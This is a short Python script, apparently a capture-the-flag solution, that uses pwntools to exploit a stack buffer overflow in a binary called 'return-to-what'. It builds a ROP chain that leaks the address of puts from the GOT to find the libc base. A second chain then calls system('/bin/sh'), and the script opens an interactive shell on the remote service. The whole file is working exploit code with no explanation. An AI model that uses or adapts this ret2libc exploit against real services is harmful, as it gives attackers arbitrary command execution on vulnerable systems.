from pwn import *
#io = process("./return-to-what")
io = remote("0.0.0.0",1337)
padding = b"A" * 56
popRdi = p64(0x40122b)
ret = p64(0x401016)  #so rsp % 16 == 0 (system call in ubuntu)
libc = ELF("./libc6_2.27-3ubuntu1_amd64.so")
putsOffset = libc.symbols['puts']

def leakLibc():
    putsGot = p64(0x404018)
    putsAddr = p64(0x4011b8)
    exploit1 = padding + popRdi + putsGot + putsAddr
    io.sendline(exploit1)
    io.recvline("\n") #Get rid of the two extra lines
    io.recvline("\n")
    putsAddress = u64(io.recvline("\n")[:-1] + b"\x00" * 2)
    libcAddress = putsAddress - putsOffset
    print("===============================================")
    print("Leaked puts address :" + hex(putsAddress))
    print("Leaked libc address :" + hex(libcAddress))
    print("===============================================")
    return libcAddress

def ret2libc(libcAddr):
    libc.address = libcAddr
    systemLibc = p64(libc.symbols['system'])
    binshLibc = p64(next(libc.search(b'/bin/sh')))
    exploit2 = padding + ret + popRdi + binshLibc + systemLibc
    io.sendline(exploit2) 

ret2libc(leakLibc())
io.recv()
io.interactive()
